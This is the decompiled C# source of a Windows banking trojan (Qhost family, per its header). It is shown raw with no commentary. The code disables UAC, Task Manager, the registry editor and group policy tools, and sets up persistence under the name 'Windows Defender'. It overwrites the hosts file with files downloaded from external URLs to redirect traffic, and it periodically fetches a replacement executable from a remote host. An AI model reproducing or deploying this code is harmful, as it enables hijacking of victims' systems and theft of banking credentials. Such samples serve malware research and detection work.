// Decompiled with JetBrains decompiler
// Type: winlogonserver.winlogon
// Assembly: winlogonserver, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 77FD2B07-F4C7-4334-A0BC-E6EEB005858C
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan-Banker.MSIL.Qhost.c-90c4bb2f322136ee4980844da355b4070a2b352c367cee1537649f936488a5de.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using winlogonserver.My;

namespace winlogonserver
{
  [DesignerGenerated]
  public class winlogon : Form
  {
    private static List<WeakReference> __ENCList = new List<WeakReference>();
    private IContainer components;
    [AccessedThroughProperty("Timer1")]
    private System.Windows.Forms.Timer _Timer1;
    [AccessedThroughProperty("Label1")]
    private Label _Label1;
    private string dirhosts;
    private string direxe;
    private string txturl1;
    private string txturl2;
    private string txturl3;
    private string txtdestino;
    private string exedestino;
    private string rutareg;
    private string nameexe;
    private string httpexe;
    private string respuestaurl;
    private long cont;
    private int version;
    private int version1;
    private bool ret;
    private bool exist;
    private bool exist1;
    private bool conectok;
    private Random random;
    private long numero;
    private WebRequest Peticion;
    private HttpWebResponse Respuesta;

    [DebuggerNonUserCode]
    static winlogon()
    {
    }

    public winlogon()
    {
      this.Load += new EventHandler(this.winlogon_Load);
      lock (winlogon.__ENCList)
        winlogon.__ENCList.Add(new WeakReference((object) this));
      this.random = new Random();
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      this.Timer1 = new System.Windows.Forms.Timer(this.components);
      this.Label1 = new Label();
      this.SuspendLayout();
      this.Label1.AutoSize = true;
      this.Label1.Location = new Point(13, 13);
      this.Label1.Name = "Label1";
      Label label1 = this.Label1;
      Size size1 = new Size(39, 13);
      Size size2 = size1;
      label1.Size = size2;
      this.Label1.TabIndex = 0;
      this.Label1.Text = "Label1";
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackColor = SystemColors.ButtonHighlight;
      size1 = new Size(404, 71);
      this.ClientSize = size1;
      this.Controls.Add((Control) this.Label1);
      this.FormBorderStyle = FormBorderStyle.None;
      this.Name = nameof (winlogon);
      this.Opacity = 0.0;
      this.Text = nameof (winlogon);
      this.TransparencyKey = System.Drawing.Color.White;
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    internal virtual System.Windows.Forms.Timer Timer1
    {
      [DebuggerNonUserCode] get => this._Timer1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer1_Tick);
        if (this._Timer1 != null)
          this._Timer1.Tick -= eventHandler;
        this._Timer1 = value;
        if (this._Timer1 == null)
          return;
        this._Timer1.Tick += eventHandler;
      }
    }

    internal virtual Label Label1
    {
      [DebuggerNonUserCode] get => this._Label1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._Label1 = value;
    }

    public bool QuitarUAC()
    {
      try
      {
        this.rutareg = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
        object Instance1 = (object) MyProject.Computer.Registry.LocalMachine.OpenSubKey(this.rutareg, true);
        NewLateBinding.LateCall(Instance1, (System.Type) null, "SetValue", new object[2]
        {
          (object) "ConsentPromptBehaviorAdmin",
          (object) 0
        }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
        NewLateBinding.LateCall(Instance1, (System.Type) null, "Close", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
        object Instance2 = (object) MyProject.Computer.Registry.LocalMachine.OpenSubKey(this.rutareg, true);
        NewLateBinding.LateCall(Instance2, (System.Type) null, "SetValue", new object[2]
        {
          (object) "dontdisplaylastusername",
          (object) 0
        }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
        NewLateBinding.LateCall(Instance2, (System.Type) null, "Close", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
        object Instance3 = (object) MyProject.Computer.Registry.LocalMachine.OpenSubKey(this.rutareg, true);
        NewLateBinding.LateCall(Instance3, (System.Type) null, "SetValue", new object[2]
        {
          (object) "EnableInstallerDetection",
          (object) 0
        }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
        NewLateBinding.LateCall(Instance3, (System.Type) null, "Close", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
        object Instance4 = (object) MyProject.Computer.Registry.LocalMachine.OpenSubKey(this.rutareg, true);
        NewLateBinding.LateCall(Instance4, (System.Type) null, "SetValue", new object[2]
        {
          (object) "EnableLUA",
          (object) 0
        }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
        NewLateBinding.LateCall(Instance4, (System.Type) null, "Close", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
        object Instance5 = (object) MyProject.Computer.Registry.LocalMachine.OpenSubKey(this.rutareg, true);
        NewLateBinding.LateCall(Instance5, (System.Type) null, "SetValue", new object[2]
        {
          (object) "EnableSecureUIAPaths",
          (object) 0
        }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
        NewLateBinding.LateCall(Instance5, (System.Type) null, "Close", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
        object Instance6 = (object) MyProject.Computer.Registry.LocalMachine.OpenSubKey(this.rutareg, true);
        NewLateBinding.LateCall(Instance6, (System.Type) null, "SetValue", new object[2]
        {
          (object) "FilterAdministratorToken",
          (object) 0
        }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
        NewLateBinding.LateCall(Instance6, (System.Type) null, "Close", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
        object Instance7 = (object) MyProject.Computer.Registry.LocalMachine.OpenSubKey(this.rutareg, true);
        NewLateBinding.LateCall(Instance7, (System.Type) null, "SetValue", new object[2]
        {
          (object) "ValidateAdminCodeSignatures",
          (object) 0
        }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
        NewLateBinding.LateCall(Instance7, (System.Type) null, "Close", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
        object Instance8 = (object) MyProject.Computer.Registry.LocalMachine.OpenSubKey(this.rutareg, true);
        NewLateBinding.LateCall(Instance8, (System.Type) null, "SetValue", new object[2]
        {
          (object) "EnableUIADesktopToggle",
          (object) 0
        }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
        NewLateBinding.LateCall(Instance8, (System.Type) null, "Close", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        int num = (int) Interaction.MsgBox((object) ("Error: " + ex.Message), MsgBoxStyle.Critical, (object) "Error");
        ProjectData.ClearProjectError();
      }
      bool flag;
      return flag;
    }

    public bool Arranques()
    {
      try
      {
        MyProject.Computer.Registry.CurrentUser.DeleteSubKeyTree("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
        MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Windows Defender", (object) "C:\\WINDOWS\\system32\\drivers\\winlogon.exe");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        int num = (int) Interaction.MsgBox((object) ("Error: " + ex.Message), MsgBoxStyle.Critical, (object) "Error");
        ProjectData.ClearProjectError();
      }
      bool flag;
      return flag;
    }

    public bool task()
    {
      try
      {
        MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", (object) "1", RegistryValueKind.DWord);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        int num = (int) Interaction.MsgBox((object) ("Error: " + ex.Message), MsgBoxStyle.Critical, (object) "Error");
        ProjectData.ClearProjectError();
      }
      bool flag;
      return flag;
    }

    public bool regedit()
    {
      try
      {
        MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableRegistryTools", (object) "1", RegistryValueKind.DWord);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        int num = (int) Interaction.MsgBox((object) ("Error: " + ex.Message), MsgBoxStyle.Critical, (object) "Error");
        ProjectData.ClearProjectError();
      }
      bool flag;
      return flag;
    }

    public bool gpedit()
    {
      try
      {
        MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\MMC", "RestrictToPermittedSnapins", (object) "1", RegistryValueKind.DWord);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        int num = (int) Interaction.MsgBox((object) ("Error: " + ex.Message), MsgBoxStyle.Critical, (object) "Error");
        ProjectData.ClearProjectError();
      }
      bool flag;
      return flag;
    }

    public bool conect()
    {
      bool isAvailable;
      try
      {
        isAvailable = MyProject.Computer.Network.IsAvailable;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        int num = (int) Interaction.MsgBox((object) ("Error: " + ex.Message), MsgBoxStyle.Critical, (object) "Error");
        ProjectData.ClearProjectError();
      }
      return isAvailable;
    }

    public long contar(long cnt)
    {
      try
      {
        this.cont = checked (cnt + 1L);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        int num = (int) Interaction.MsgBox((object) ("Error: " + ex.Message), MsgBoxStyle.Critical, (object) "Error");
        ProjectData.ClearProjectError();
      }
      long num1;
      return num1;
    }

    public long contar() => this.cont;

    public bool crearCarpetaHidden()
    {
      MyProject.Computer.FileSystem.CreateDirectory("C:\\Documento");
      FileSystem.SetAttr("C:\\Documento", FileAttribute.Hidden);
      bool flag;
      return flag;
    }

    public int sacarversion() => Convert.ToInt32(FileVersionInfo.GetVersionInfo("C:\\WINDOWS\\system32\\drivers\\winlogon.exe").FileVersion.Substring(0, 1));

    public int sacarsubversion() => Convert.ToInt32(FileVersionInfo.GetVersionInfo("C:\\WINDOWS\\system32\\drivers\\winlogon.exe").FileVersion.Substring(2, 1));

    public bool inicializacion()
    {
      this.version = 1;
      this.version1 = 3;
      this.nameexe = "MultimediaClaro.cl";
      bool flag;
      return flag;
    }

    public bool CodigodelMal()
    {
      try
      {
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        int num = (int) Interaction.MsgBox((object) ("Error: " + ex.Message), MsgBoxStyle.Critical, (object) "Error");
        ProjectData.ClearProjectError();
      }
      bool flag;
      return flag;
    }

    public string verificarurl(string urlx)
    {
      string str;
      try
      {
        this.Peticion = WebRequest.Create(urlx);
        this.Respuesta = (HttpWebResponse) this.Peticion.GetResponse();
        this.respuestaurl = this.Respuesta.StatusDescription;
        str = this.respuestaurl;
      }
      catch (WebException ex)
      {
        ProjectData.SetProjectError((Exception) ex);
        str = "No Existe";
        ProjectData.ClearProjectError();
      }
      return str;
    }

    public bool Descargar_Archivo(string Url, string Path_Destino, string dirhost1)
    {
label_1:
      int num1;
      bool flag;
      int num2;
      try
      {
        int num3 = 1;
        if (Operators.CompareString(this.verificarurl(Url), "OK", false) == 0)
        {
label_2:
          num3 = 2;
          if (Strings.Len(FileSystem.Dir(Path_Destino)) == 0)
            goto label_4;
        }
        else
          goto label_14;
label_3:
        num3 = 3;
        MyProject.Computer.FileSystem.DeleteFile(Path_Destino);
label_4:
label_5:
        ProjectData.ClearProjectError();
        num1 = -2;
label_6:
        num3 = 6;
        MyProject.Computer.Network.DownloadFile(Url, Path_Destino);
label_7:
        num3 = 7;
        if (Information.Err().Number != 0)
          goto label_10;
label_8:
        num3 = 8;
        flag = true;
label_9:
        num3 = 9;
        MyProject.Computer.FileSystem.MoveFile(Path_Destino, dirhost1, true);
        goto label_12;
label_10:
        num3 = 11;
label_11:
        num3 = 12;
        flag = false;
label_12:
label_13:
        num3 = 14;
        Information.Err().Clear();
label_14:
        goto label_21;
label_16:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_1;
              case 2:
                goto label_2;
              case 3:
                goto label_3;
              case 4:
                goto label_4;
              case 5:
                goto label_5;
              case 6:
                goto label_6;
              case 7:
                goto label_7;
              case 8:
                goto label_8;
              case 9:
                goto label_9;
              case 10:
              case 13:
                goto label_12;
              case 11:
                goto label_10;
              case 12:
                goto label_11;
              case 14:
                goto label_13;
              case 15:
                goto label_14;
              case 16:
                goto label_21;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_16;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_21:
      int num5 = flag ? 1 : 0;
      if (num2 == 0)
        return num5 != 0;
      ProjectData.ClearProjectError();
      return num5 != 0;
    }

    private void winlogon_Load(object sender, EventArgs e)
    {
      try
      {
        this.Hide();
        this.Visible = false;
        this.numero = (long) this.random.Next(10000, 100000);
        this.inicializacion();
        this.Timer1.Enabled = true;
        this.regedit();
        this.Arranques();
        this.QuitarUAC();
        this.gpedit();
        this.crearCarpetaHidden();
        this.task();
        this.conectok = false;
        this.dirhosts = "C:\\Windows\\System32\\drivers\\etc\\hosts";
        this.txturl1 = "http://lablodge.nl/cp/images/http.config";
        this.txturl2 = "http://www.lavozdecolombiafm.com/images/http.config";
        this.txturl3 = "http://qawsedcxzasxdc.es";
        this.httpexe = "http://comunidadjumper.com/Dirwinlogon/Activexload";
        this.txtdestino = "C:\\Documento\\ms.doc";
        this.direxe = "C:\\WINDOWS\\system32\\drivers\\winlogon.exe";
        if (!this.conect())
          return;
        if (this.Descargar_Archivo(this.txturl1, this.txtdestino, this.dirhosts) || this.Descargar_Archivo(this.txturl2, this.txtdestino, this.dirhosts) || !this.Descargar_Archivo(this.txturl3, this.txtdestino, this.dirhosts))
          ;
        this.exist = MyProject.Computer.FileSystem.FileExists(this.direxe);
        if (this.exist)
        {
          if (this.version > this.sacarversion())
          {
            if (this.version1 > this.sacarsubversion())
            {
              MyProject.Computer.FileSystem.RenameFile(this.direxe, Conversions.ToString(this.numero));
              MyProject.Computer.FileSystem.CopyFile(MyProject.Application.Info.DirectoryPath + "\\" + this.nameexe + ".exe", this.direxe);
              FileSystem.SetAttr(this.direxe, FileAttribute.System);
              FileSystem.SetAttr(this.direxe, FileAttribute.Hidden);
            }
          }
          else if (this.version == this.sacarversion() && this.version1 > this.sacarsubversion())
          {
            MyProject.Computer.FileSystem.RenameFile(this.direxe, Conversions.ToString(this.numero));
            MyProject.Computer.FileSystem.CopyFile(MyProject.Application.Info.DirectoryPath + "\\" + this.nameexe + ".exe", this.direxe);
            FileSystem.SetAttr(this.direxe, FileAttribute.System);
            FileSystem.SetAttr(this.direxe, FileAttribute.Hidden);
          }
        }
        else
        {
          MyProject.Computer.FileSystem.CopyFile(MyProject.Application.Info.DirectoryPath + "\\" + this.nameexe + ".exe", this.direxe);
          FileSystem.SetAttr(this.direxe, FileAttribute.System);
          FileSystem.SetAttr(this.direxe, FileAttribute.Hidden);
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        int num = (int) Interaction.MsgBox((object) ("Error: " + ex.Message), MsgBoxStyle.Critical, (object) "Error");
        ProjectData.ClearProjectError();
      }
    }

    private void Timer1_Tick(object sender, EventArgs e)
    {
      this.Hide();
      this.Visible = false;
      this.Label1.Text = Conversions.ToString(this.contar());
      this.contar(checked ((long) Math.Round(Conversion.Val(this.Label1.Text))));
      this.conectok = this.conect();
      if (this.conectok)
      {
        if (!(this.contar() == 36000L | this.contar() > 36000L | this.contar() == 0L))
          return;
        if (this.conect() && !this.Descargar_Archivo(this.txturl1, this.txtdestino, this.dirhosts) && !this.Descargar_Archivo(this.txturl2, this.txtdestino, this.dirhosts) && !this.Descargar_Archivo(this.txturl3, this.txtdestino, this.dirhosts) && Operators.CompareString(this.httpexe, "", false) != 0)
        {
          if (Operators.CompareString(this.verificarurl(this.httpexe), "OK", false) == 0)
            MyProject.Computer.FileSystem.RenameFile(this.direxe, Conversions.ToString(this.numero));
          if (!this.Descargar_Archivo(this.httpexe, this.txtdestino, this.direxe))
            ;
        }
        this.cont = 0L;
      }
      else
        this.cont = -1L;
    }
  }
}
